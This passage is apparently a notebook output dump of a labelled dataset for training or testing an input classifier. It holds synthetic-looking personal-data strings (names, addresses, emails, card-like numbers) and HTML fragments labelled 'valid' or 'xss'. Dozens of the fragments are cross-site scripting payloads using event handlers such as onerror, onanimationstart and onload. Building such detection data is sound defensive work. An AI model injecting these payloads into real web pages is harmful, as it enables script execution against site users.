#  {'pattern': 'torrija', 'type': 'valid'},
#  {'pattern': '4337', 'type': 'valid'},
#  {'pattern': 'perih1lio', 'type': 'valid'},
#  {'pattern': 'gervasio', 'type': 'valid'},
#  {'pattern': 'young-kyun@forohh.cl', 'type': 'valid'},
#  {'pattern': 'jose muoz san roman, s/n,', 'type': 'valid'},
#  {'pattern': 'xavier', 'type': 'valid'},
#  {'pattern': 'tarasca', 'type': 'valid'},
#  {'pattern': 'c/ javea 57', 'type': 'valid'},
#  {'pattern': '22470', 'type': 'valid'},
#  {'pattern': 'chabert', 'type': 'valid'},
#  {'pattern': 'chinchintor', 'type': 'valid'},
#  {'pattern': 'co01', 'type': 'valid'},
#  {'pattern': 'gierasch.casini@goovitae.cu', 'type': 'valid'},
#  {'pattern': '13107', 'type': 'valid'},
#  {'pattern': '8230522127552712', 'type': 'valid'},
#  {'pattern': 'silcula', 'type': 'valid'},
#  {'pattern': 'juan de dios', 'type': 'valid'},
#  {'pattern': 'oleilnikov_balasko@hostprofessional.ac', 'type': 'valid'},
#  {'pattern': '84996241v', 'type': 'valid'},
#  {'pattern': 'villarejo-periesteban', 'type': 'valid'},
#  {'pattern': '47172', 'type': 'valid'},
#  {'pattern': '414rd7f132o', 'type': 'valid'},
#  {'pattern': '3614', 'type': 'valid'},
#  {'pattern': 'e561o', 'type': 'valid'},
#  {'pattern': 'culler castanyer', 'type': 'valid'},
#  {'pattern': '54925627v', 'type': 'valid'},
#  {'pattern': 'c/ obispo alonso suarez, 163,', 'type': 'valid'},
#  {'pattern': '34347', 'type': 'valid'},
#  {'pattern': '6552399616832844', 'type': 'valid'},
#  {'pattern': 'indis6r4cin', 'type': 'valid'},
#  {'pattern': 'damacia', 'type': 'valid'},
#  {'pattern': 'signoret@pisossantcugat.cat', 'type': 'valid'},
#  {'pattern': '78153384m', 'type': 'valid'},
#  {'pattern': 'carpio de tajo, el', 'type': 'valid'},
#  {'pattern': '49280', 'type': 'valid'},
#  {'pattern': 'mgi4a', 'type': 'valid'},
#  {'pattern': '7896', 'type': 'valid'},
#  {'pattern': '2isopada', 'type': 'valid'},
#  {'pattern': 'berroteran', 'type': 'valid'},
#  {'pattern': '87258503e', 'type': 'valid'},
#  {'pattern': 'carrera 55,', 'type': 'valid'},
#  {'pattern': '16311', 'type': 'valid'},
#  {'pattern': '9269450355652252', 'type': 'valid'},
#  {'pattern': 'dra2atizar', 'type': 'valid'},
#  {'pattern': 'algu chavarri', 'type': 'valid'},
#  {'pattern': 'calle miguel lopez de legazpi, 48, 8f', 'type': 'valid'},
#  {'pattern': '50692', 'type': 'valid'},
#  {'pattern': 'kipp', 'type': 'valid'},
#  {'pattern': 'rob', 'type': 'valid'},
#  {'pattern': 'juneho', 'type': 'valid'},
#  {'pattern': 'retasac5n', 'type': 'valid'},
#  {'pattern': 'torreblanca pujades', 'type': 'valid'},
#  {'pattern': 'bellew@frioelectric.no', 'type': 'valid'},
#  {'pattern': 'madrazo 115', 'type': 'valid'},
#  {'pattern': 'sotalbo', 'type': 'valid'},
#  {'pattern': 'ayyuce', 'type': 'valid'},
#  {'pattern': 'broun_granlund@purplemoongrn.fi', 'type': 'valid'},
#  {'pattern': 'tauro 34 7b', 'type': 'valid'},
#  {'pattern': 'iznatoraf', 'type': 'valid'},
#  {'pattern': '0058041048086449', 'type': 'valid'},
#  {'pattern': 'lor81a5o', 'type': 'valid'},
#  {'pattern': 'ricard', 'type': 'valid'},
#  {'pattern': '61z', 'type': 'valid'},
#  {'pattern': 'rigau amer', 'type': 'valid'},
#  {'pattern': 'pogam@soycatalan.aq', 'type': 'valid'},
#  {'pattern': 'orbita', 'type': 'valid'},
#  {'pattern': '6470509098489788', 'type': 'valid'},
#  {'pattern': 're681g48rdia', 'type': 'valid'},
#  {'pattern': 'astor', 'type': 'valid'},
#  {'pattern': 'glazar@x2.com.net', 'type': 'valid'},
#  {'pattern': '62746544z', 'type': 'valid'},
#  {'pattern': 'guadalcanal', 'type': 'valid'},
#  {'pattern': 'neils', 'type': 'valid'},
#  {'pattern': 'servitje areggiani', 'type': 'valid'},
#  {'pattern': 'rocheman@sindns.er', 'type': 'valid'},
#  {'pattern': 'caada de los ingleses, 117,', 'type': 'valid'},
#  {'pattern': 'cantoria', 'type': 'valid'},
#  {'pattern': '1059842916427607', 'type': 'valid'},
#  {'pattern': 'fullum6', 'type': 'valid'},
#  {'pattern': 'crast_litel@cortell.al', 'type': 'valid'},
#  {'pattern': '68689912k', 'type': 'valid'},
#  {'pattern': 'oliva', 'type': 'valid'},
#  {'pattern': '45939', 'type': 'valid'},
#  {'pattern': 'trixie', 'type': 'valid'},
#  {'pattern': 'falerno', 'type': 'valid'},
#  {'pattern': '2a6in6rosa', 'type': 'valid'},
#  {'pattern': 'poca urzagaste', 'type': 'valid'},
#  {'pattern': 'infantes de carrion, 122', 'type': 'valid'},
#  {'pattern': '0858629096397391', 'type': 'valid'},
#  {'pattern': 'c944i6a', 'type': 'valid'},
#  {'pattern': 'rosset', 'type': 'valid'},
#  {'pattern': 'calle teresa pamies i bertran 21,', 'type': 'valid'},
#  {'pattern': 'santa maria de corc', 'type': 'valid'},
#  {'pattern': 'papageno', 'type': 'valid'},
#  {'pattern': '511amasa', 'type': 'valid'},
#  {'pattern': 'daren9', 'type': 'valid'},
#  {'pattern': 'acimentarse', 'type': 'valid'},
#  {'pattern': '90660924f', 'type': 'valid'},
#  {'pattern': 'av. carlos marx s/n', 'type': 'valid'},
#  {'pattern': '7309058964317313', 'type': 'valid'},
#  {'pattern': 'lyle', 'type': 'valid'},
#  {'pattern': 'el khouri hausdorf', 'type': 'valid'},
#  {'pattern': 'darrieu@redstarz.sv', 'type': 'valid'},
#  {'pattern': 'calle robregordo, 171 10-c', 'type': 'valid'},
#  {'pattern': 'andratx', 'type': 'valid'},
#  {'pattern': '4296025977282656', 'type': 'valid'},
#  {'pattern': 'revill5', 'type': 'valid'},
#  {'pattern': 'rigby', 'type': 'valid'},
#  {'pattern': 'pascuet landivar', 'type': 'valid'},
#  {'pattern': '45053569l', 'type': 'valid'},
#  {'pattern': 'duende, 138,', 'type': 'valid'},
#  {'pattern': '40170', 'type': 'valid'},
#  {'pattern': '491vi06a5', 'type': 'valid'},
#  {'pattern': '35817134q', 'type': 'valid'},
#  {'pattern': '19432', 'type': 'valid'},
#  {'pattern': 'reggis', 'type': 'valid'},
#  {'pattern': 'p5nderativa', 'type': 'valid'},
#  {'pattern': 'rurick5', 'type': 'valid'},
#  {'pattern': 'par4u8i67t3', 'type': 'valid'},
#  {'pattern': '66702102d', 'type': 'valid'},
#  {'pattern': 'comandante barja 84,', 'type': 'valid'},
#  {'pattern': '0227003559920538', 'type': 'valid'},
#  {'pattern': 'tewksbur', 'type': 'valid'},
#  {'pattern': 'rhys', 'type': 'valid'},
#  {'pattern': 'rigand@suncorp.mk', 'type': 'valid'},
#  {'pattern': 'c/ pontevedra 25, 6a', 'type': 'valid'},
#  {'pattern': 'ferreruela', 'type': 'valid'},
#  {'pattern': '0720546534771199', 'type': 'valid'},
#  {'pattern': 'coursdev', 'type': 'valid'},
#  {'pattern': '5966', 'type': 'valid'},
#  {'pattern': 'dorene6', 'type': 'valid'},
#  {'pattern': 'beiza ivanco', 'type': 'valid'},
#  {'pattern': 'butts@maxtienda.na', 'type': 'valid'},
#  {'pattern': 'pesquera, la', 'type': 'valid'},
#  {'pattern': '24152', 'type': 'valid'},
#  {'pattern': 'akio', 'type': 'valid'},
#  {'pattern': 'peng1in', 'type': 'valid'},
#  {'pattern': 'segu san marful', 'type': 'valid'},
#  {'pattern': 'knight_freihart@tresbrujas.qa', 'type': 'valid'},
#  {'pattern': 'azorin, 167', 'type': 'valid'},
#  {'pattern': 'cuevas labradas', 'type': 'valid'},
#  {'pattern': 'semicopado', 'type': 'valid'},
#  {'pattern': '8903', 'type': 'valid'},
#  {'pattern': 'm0nuta9', 'type': 'valid'},
#  {'pattern': 'domingo', 'type': 'valid'},
#  {'pattern': 'plaa gabriela mistral, 140', 'type': 'valid'},
#  {'pattern': 'aldehuela del codonal', 'type': 'valid'},
#  {'pattern': 'mcduffie', 'type': 'valid'},
#  {'pattern': 'manganear', 'type': 'valid'},
#  {'pattern': 'dabbas hurtado', 'type': 'valid'},
#  {'pattern': '76518142v', 'type': 'valid'},
#  {'pattern': 'ajamil', 'type': 'valid'},
#  {'pattern': '0567191601469528', 'type': 'valid'},
#  {'pattern': 'opopnaco', 'type': 'valid'},
#  {'pattern': '4599', 'type': 'valid'},
#  {'pattern': 'cangrenarse', 'type': 'valid'},
#  {'pattern': 'pablo de la cruz', 'type': 'valid'},
#  {'pattern': 'jorey@20horas.ao', 'type': 'valid'},
#  {'pattern': '37200229y', 'type': 'valid'},
#  {'pattern': 'piqueras', 'type': 'valid'},
#  {'pattern': '5359941637472612', 'type': 'valid'},
#  {'pattern': 'sanidad', 'type': 'valid'},
#  {'pattern': 'dalia', 'type': 'valid'},
#  {'pattern': '13061311w', 'type': 'valid'},
#  {'pattern': 'c/ angel ochotorena, 132, 10?b', 'type': 'valid'},
#  {'pattern': '3309243329438501', 'type': 'valid'},
#  {'pattern': 'darill', 'type': 'valid'},
#  {'pattern': '4909', 'type': 'valid'},
#  {'pattern': 'mckibbon', 'type': 'valid'},
#  {'pattern': 'rolanda', 'type': 'valid'},
#  {'pattern': 'maynez giovannetti', 'type': 'valid'},
#  {'pattern': '16824275m', 'type': 'valid'},
#  {'pattern': 'cuesta pizarro 12, 4?d', 'type': 'valid'},
#  {'pattern': '09737', 'type': 'valid'},
#  {'pattern': '4948118153450551', 'type': 'valid'},
#  {'pattern': 'cer97708or7', 'type': 'valid'},
#  {'pattern': 'montfort fiuza', 'type': 'valid'},
#  {'pattern': '51620770f', 'type': 'valid'},
#  {'pattern': 'plza. euzkaltzandia 56 2-b', 'type': 'valid'},
#  {'pattern': '18670', 'type': 'valid'},
#  {'pattern': '5561938510666442', 'type': 'valid'},
#  {'pattern': '0nsu2iso', 'type': 'valid'},
#  {'pattern': '6622', 'type': 'valid'},
#  {'pattern': 'pawley@santacruzdelvoto.vu', 'type': 'valid'},
#  {'pattern': 'calle republique dominicana, 85', 'type': 'valid'},
#  {'pattern': '37340', 'type': 'valid'},
#  {'pattern': '6028275465209403', 'type': 'valid'},
#  {'pattern': 'naca39', 'type': 'valid'},
#  {'pattern': 'rodolfo', 'type': 'valid'},
#  {'pattern': 'franey_travers@hayunmundoahifuera.br', 'type': 'valid'},
#  {'pattern': '07441681p', 'type': 'valid'},
#  {'pattern': 'bolvir', 'type': 'valid'},
#  {'pattern': '45222', 'type': 'valid'},
#  {'pattern': 'la_verne', 'type': 'valid'},
#  {'pattern': 'diafragmar', 'type': 'valid'},
#  {'pattern': 'chaddie', 'type': 'valid'},
#  {'pattern': 't4ne0r84oso', 'type': 'valid'},
#  {'pattern': 'ramells lam', 'type': 'valid'},
#  {'pattern': 'handy.leleu@chevrolet-volt.gob', 'type': 'valid'},
#  {'pattern': 'parque barranco de coquin 67, 8?d', 'type': 'valid'},
#  {'pattern': 'torres de barbus', 'type': 'valid'},
#  {'pattern': 'saree', 'type': 'valid'},
#  {'pattern': 'albuminmetro', 'type': 'valid'},
#  ...]

# %%
xss
# Out:
# [{'pattern': '<li><a href="/wiki/file:socrates.png" class="image"><img alt="socrates.png" src="//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/socrates.png/18px-socrates.png" decoding="async" width="18" height="28" class="noviewer" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/socrates.png/27px-socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/socrates.png/36px-socrates.png 2x" data-file-width="326" data-file-height="500" /> </a> <a href="/wiki/portal:philosophy" title="portal:philosophy">philosophy&#32;portal </a> </li> </ul>',
#   'type': 'valid'},
#  {'pattern': '<tt onmouseover="alert(1)">test</tt>', 'type': 'xss'},
#  {'pattern': '</span> <span class="reference-text">steering for the 1995 "<a href="/wiki/history_of_autonomous_cars#1990s" class="mw-redirect" title="history of autonomous cars">no hands across america </a>" required "only a few human assists".',
#   'type': 'valid'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation web"><a rel="nofollow" class="external text" href="https://www.mileseducation.com/finance/artificial_intelligence">"miles education | future of finance | blockchain fundamentals for f&amp;a professionals certificate" </a>. <i>www.mileseducation.com </i><span class="reference-accessdate">. retrieved <span class="nowrap">26 september',
#   'type': 'valid'},
#  {'pattern': '</span>. <a href="/wiki/digital_object_identifier" title="digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1016/s0921-8890(05)80025-9">10.1016/s0921-8890(05)80025-9 </a>. <a rel="nofollow" class="external text" href="https://web.archive.org/web/20070809020912/http://people.csail.mit.edu/brooks/papers/elephants.pdf">archived </a> <span class="cs1-format">(pdf)',
#   'type': 'valid'},
#  {'pattern': '<li id="cite_note-118"><span class="mw-cite-backlink"><b><a href="#cite_ref-118">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/contextualism" title="contextualism">contextualism </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<li id="cite_note-representing_causation-95"><span class="mw-cite-backlink">^ <a href="#cite_ref-representing_causation_95-0"><sup><i><b>a </b> </i> </sup> </a> <a href="#cite_ref-representing_causation_95-1"><sup><i><b>b </b> </i> </sup> </a>',
#   'type': 'valid'},
#  {'pattern': '<tr><td class="plainlist" style="padding:0 0.1em 0.4em">',
#   'type': 'valid'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/mind–body_problem" title="mind–body problem">mind–body problem </a>',
#   'type': 'valid'},
#  {'pattern': '<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<col draggable="true" ondragenter="alert(1)">test</col>',
#   'type': 'xss'},
#  {'pattern': '<caption onpointerdown=alert(1)>xss</caption>', 'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '</span><link rel="mw-deduplicated-inline-style" href="mw-data:templatestyles:r935243608"/> </li>',
#   'type': 'valid'},
#  {'pattern': '<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>',
#   'type': 'xss'},
#  {'pattern': '<style onmouseleave="alert(1)">test</style>', 'type': 'xss'},
#  {'pattern': '<svg><meta onload=alert(1)></meta>', 'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/programming_language" title="programming language">programming language </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<figcaption onpointerleave=alert(1)>xss</figcaption>',
#   'type': 'xss'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation news"><a rel="nofollow" class="external text" href="https://www.economist.com/news/special-report/21700756-artificial-intelligence-boom-based-old-idea-modern-twist-not">"from not working to neural networking" </a>. <i>the economist </i>. 2016<span class="reference-accessdate">. retrieved <span class="nowrap">26 april',
#   'type': 'valid'},
#  {'pattern': '</div>', 'type': 'valid'},
#  {'pattern': '<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>',
#   'type': 'xss'},
#  {'pattern': '<input type=image src=1 onerror=alert(1)>', 'type': 'xss'},
#  {'pattern': '<strong ondblclick="alert(1)">test</strong>', 'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/computer_data_storage" title="computer data storage">information storage systems </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<div draggable="true" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>',
#   'type': 'xss'},
#  {'pattern': '</span><link rel="mw-deduplicated-inline-style" href="mw-data:templatestyles:r935243608"/> </li>',
#   'type': 'valid'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation journal"><a href="/wiki/woody_evans" title="woody evans">evans, woody </a> (2015). "posthuman rights: dimensions of transhuman worlds". <i>teknokultura </i>. <b>12 </b> (2). <a href="/wiki/digital_object_identifier" title="digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.5209/rev_tk.2015.v12.n2.49072">10.5209/rev_tk.2015.v12.n2.49072 </a>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=teknokultura&amp;rft.atitle=posthuman rights: dimensions of transhuman worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info:doi/10.5209/rev_tk.2015.v12.n2.49072&amp;rft.aulast=evans&amp;rft.aufirst=woody&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<spacer onkeypress="alert(1)" contenteditable>test</spacer>',
#   'type': 'xss'},
#  {'pattern': '<li><cite id="citerefoudeyer2010" class="citation journal">oudeyer, p-y. (2010). <a rel="nofollow" class="external text" href="http://www.pyoudeyer.com/ieeetamdoudeyer10.pdf">"on the impact of robotics in behavioral and cognitive sciences: from insect navigation to human cognitive development" </a> <span class="cs1-format">(pdf)',
#   'type': 'valid'},
#  {'pattern': '<style>@keyframes slidein {}</style><center style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></center>',
#   'type': 'xss'},
#  {'pattern': '<pre draggable="true" ondragend="alert(1)">test</pre>',
#   'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<li><a href="#citerefnilsson1998">nilsson 1998 </a>, chpt. 8 </li> </ul>',
#   'type': 'valid'},
#  {'pattern': '<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<style>@keyframes x{}</style><main style="animation-name:x" onanimationstart="alert(1)"></main>',
#   'type': 'xss'},
#  {'pattern': '<article draggable="true" ondrag="alert(1)">test</article>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/computational_physics" title="computational physics">computational physics </a> </li>',
#   'type': 'valid'},
#  {'pattern': '</span>. <i>behavioral and brain sciences </i>. <b>3 </b> (3): 417–457. <a href="/wiki/digital_object_identifier" title="digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1017/s0140525x00005756">10.1017/s0140525x00005756 </a>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=behavioral and brain sciences&amp;rft.atitle=minds, brains and programs&amp;rft.volume=3&amp;rft.issue=3&amp;rft.pages=417-457&amp;rft.date=1980&amp;rft_id=info:doi/10.1017/s0140525x00005756&amp;rft.aulast=searle&amp;rft.aufirst=john&amp;rft_id=http://cogprints.org/7150/1/10.1.1.83.5248.pdf&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<rtc draggable="true" ondragleave="alert(1)">test</rtc>',
#   'type': 'xss'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation journal">prakken, henry (31 august 2017). "on the problem of making autonomous vehicles conform to traffic law". <i>artificial intelligence and law </i>. <b>25 </b> (3): 341–363. <a href="/wiki/digital_object_identifier" title="digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1007/s10506-017-9210-0">10.1007/s10506-017-9210-0 </a>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=artificial intelligence and law&amp;rft.atitle=on the problem of making autonomous vehicles conform to traffic law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info:doi/10.1007/s10506-017-9210-0&amp;rft.aulast=prakken&amp;rft.aufirst=henry&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '</span><span class="mw-editsection"><span class="mw-editsection-bracket">[',
#   'type': 'valid'},
#  {'pattern': '<sup id="cite_ref-biological_intelligence_vs._intelligence_in_general_16-1" class="reference"><a href="#cite_note-biological_intelligence_vs._intelligence_in_general-16">&#91;16&#93; </a> </sup>',
#   'type': 'valid'},
#  {'pattern': '<div class="thumbcaption">', 'type': 'valid'},
#  {'pattern': '<li id="cite_note-recurse-409"><span class="mw-cite-backlink"><b><a href="#cite_ref-recurse_409-0">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<div draggable="true" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>',
#   'type': 'xss'},
#  {'pattern': '</div>', 'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/glossary_of_calculus" title="glossary of calculus">calculus </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<frame oncut="alert(1)" contenteditable>test</frame>',
#   'type': 'xss'},
#  {'pattern': '<ul class="simple">', 'type': 'valid'},
#  {'pattern': '<frameset onmouseover="alert(1)">test</frameset>',
#   'type': 'xss'},
#  {'pattern': '<style>@keyframes x{}</style><nobr style="animation-name:x" onanimationstart="alert(1)"></nobr>',
#   'type': 'xss'},
#  {'pattern': '<h4><span class="mw-headline" id="technological_singularity">technological singularity',
#   'type': 'valid'},
#  {'pattern': '</span>(1700) </li>', 'type': 'valid'},
#  {'pattern': '<iframe onload=alert(1)></iframe>', 'type': 'xss'},
#  {'pattern': '<strong draggable="true" ondragstart="alert(1)">test</strong>',
#   'type': 'xss'},
#  {'pattern': '</span> </h3>', 'type': 'valid'},
#  {'pattern': '<li id="cite_note-304"><span class="mw-cite-backlink"><b><a href="#cite_ref-304">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<!doctype html><html class="no-js" lang="en" >',
#   'type': 'valid'},
#  {'pattern': '<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationstart="alert(1)"></h1>',
#   'type': 'xss'},
#  {'pattern': '<article onpointerleave=alert(1)>xss</article>', 'type': 'xss'},
#  {'pattern': '<nextid onmousemove="alert(1)">test</nextid>', 'type': 'xss'},
#  {'pattern': 'javascript:document.location=', 'type': 'xss'},
#  {'pattern': '<style>@keyframes x{}</style><area style="animation-name:x" onanimationend="alert(1)"></area>',
#   'type': 'xss'},
#  {'pattern': '<blockquote onpointermove=alert(1)>xss</blockquote>',
#   'type': 'xss'},
#  {'pattern': '<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<div style="padding:0em 0.25em">', 'type': 'valid'},
#  {'pattern': '</span><span class="mw-editsection"><span class="mw-editsection-bracket">[',
#   'type': 'valid'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<style>@keyframes x{}</style><title style="animation-name:x" onanimationend="alert(1)"></title>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/brain–computer_interface" title="brain–computer interface">neurocybernetics </a> </li>',
#   'type': 'valid'},
#  {'pattern': '</div> </td> </tr><tr><th scope="row" class="navbox-group" style="width:1%">mathematics<br />of computing </th><td class="navbox-list navbox-odd" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px">',
#   'type': 'valid'},
#  {'pattern': '<h2>built-in services<a class="headerlink" href="#built-in-services" title="permalink to this headline">¶</a></h2>',
#   'type': 'valid'},
#  {'pattern': '<noembed onpointerout=alert(1)>xss</noembed>', 'type': 'xss'},
#  {'pattern': '<data onbeforecut="alert(1)" contenteditable>test</data>',
#   'type': 'xss'},
#  {'pattern': '<a href="http://ha.ckers.org@google"></a>', 'type': 'xss'},
#  {'pattern': '<plaintext oncut="alert(1)" contenteditable>test</plaintext>',
#   'type': 'xss'},
#  {'pattern': '<s onmousedown="alert(1)">test</s>', 'type': 'xss'},
#  {'pattern': '<address onkeypress="alert(1)" contenteditable>test</address>',
#   'type': 'xss'},
#  {'pattern': '<div style="padding:0em 0.25em">', 'type': 'valid'},
#  {'pattern': '<optgroup onmouseover="alert(1)">test</optgroup>',
#   'type': 'xss'},
#  {'pattern': '</span> <span class="reference-text">', 'type': 'valid'},
#  {'pattern': '</span> <span class="reference-text">celli, fabio, pietro zani massani, and bruno lepri. "profilio: psychometric profiling to boost social media advertising." proceedings of the 2017 acm on multimedia conference. acm, 2017 <a rel="nofollow" class="external autonumber" href="https://www.researchgate.net/publication/320542489_profilio_psychometric_profiling_to_boost_social_media_advertising">[1] </a>',
#   'type': 'valid'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/computability_theory" title="computability theory">computability theory </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<script onmouseover="alert(1)">test</script>', 'type': 'xss'},
#  {'pattern': '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style="position:absolute;" onanimationcancel="alert(1)"></sub>',
#   'type': 'xss'},
#  {'pattern': 'testing.</p>', 'type': 'valid'},
#  {'pattern': '<image onclick="alert(1)">test', 'type': 'xss'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<tfoot onclick="alert(1)">test</tfoot>', 'type': 'xss'},
#  {'pattern': '<ul onpointerenter=alert(1)>xss</ul>', 'type': 'xss'},
#  {'pattern': '<bdo draggable="true" ondragenter="alert(1)">test</bdo>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/mind" title="mind">mind </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>',
#   'type': 'xss'},
#  {'pattern': '<style>@keyframes slidein {}</style><shadow style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></shadow>',
#   'type': 'xss'},
#  {'pattern': '<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>',
#   'type': 'xss'},
#  {'pattern': '<dd onmouseout="alert(1)">test</dd>', 'type': 'xss'},
#  {'pattern': '<div class="thumb tright">', 'type': 'valid'},
#  {'pattern': '<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/automated_planning_and_scheduling" title="automated planning and scheduling">planning </a> </li>',
#   'type': 'valid'},
#  {'pattern': '</span> <span class="reference-text">', 'type': 'valid'},
#  {'pattern': '<data draggable="true" ondragstart="alert(1)">test</data>',
#   'type': 'xss'},
#  {'pattern': '</ul>', 'type': 'valid'},
#  {'pattern': '<li><a href="#citerefrussellnorvig2003">russell &amp; norvig 2003 </a>, pp.&#160;649–788, </li>',
#   'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/underdetermination" title="underdetermination">underdetermination </a> </li>',
#   'type': 'valid'},
#  {'pattern': '</span> <span class="reference-text"><a href="#citerefmccorduck2004">mccorduck 2004 </a>, pp.&#160;480–483.',
#   'type': 'valid'},
#  {'pattern': '</span> </h4>', 'type': 'valid'},
#  {'pattern': '<a href="intro/overview.html" class="btn btn-neutral float-right" title="scrapy at a glance" accesskey="n" rel="next">next <span class="fa fa-arrow-circle-right">',
#   'type': 'valid'},
#  {'pattern': '</span>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=unknown&amp;rft.jtitle=zdnet&amp;rft.atitle=half of americans do not believe deepfake news could target them online&amp;rft.aulast=brown&amp;rft.aufirst=eileen&amp;rft_id=https://www.zdnet.com/article/half-of-americans-do-not-believe-deepfake-news-could-target-them-online/&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<sub draggable="true" ondragend="alert(1)">test</sub>',
#   'type': 'xss'},
#  {'pattern': '<li><cite id="citerefturing1950" class="citation"><a href="/wiki/alan_turing" title="alan turing">turing, alan </a> (october 1950), "computing machinery and intelligence", <i><a href="/wiki/mind_(journal)" title="mind (journal)">mind </a> </i>, <b>lix </b> (236): 433–460, <a href="/wiki/digital_object_identifier" title="digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1093/mind/lix.236.433">10.1093/mind/lix.236.433 </a>, <a href="/wiki/international_standard_serial_number" title="international standard serial number">issn </a>&#160;<a rel="nofollow" class="external text" href="//www.worldcat.org/issn/0026-4423">0026-4423 </a> </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=mind&amp;rft.atitle=computing machinery and intelligence&amp;rft.volume=lix&amp;rft.issue=236&amp;rft.pages=433-460&amp;rft.date=1950-10&amp;rft_id=info:doi/10.1093/mind/lix.236.433&amp;rft.issn=0026-4423&amp;rft.aulast=turing&amp;rft.aufirst=alan&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<dialog draggable="true" ondragenter="alert(1)">test</dialog>',
#   'type': 'xss'},
#  {'pattern': '<iframe onblur=alert(1) id=x><input autofocus>', 'type': 'xss'},
#  {'pattern': '<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>',
#   'type': 'xss'},
#  {'pattern': '<script src="_static/js/hoverxref.js"></script>',
#   'type': 'valid'},
#  {'pattern': '</span>(2014) </li>', 'type': 'valid'},
#  {'pattern': 'refuting mathematical objection:', 'type': 'valid'},
#  {'pattern': '</span> </li>', 'type': 'valid'},
#  {'pattern': '</span> </li>', 'type': 'valid'},
#  {'pattern': '<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/philosophy_of_computer_science" title="philosophy of computer science">computer science </a> </li> </ul> </li>',
#   'type': 'valid'},
#  {'pattern': '<em draggable="true" ondragleave="alert(1)">test</em>',
#   'type': 'xss'},
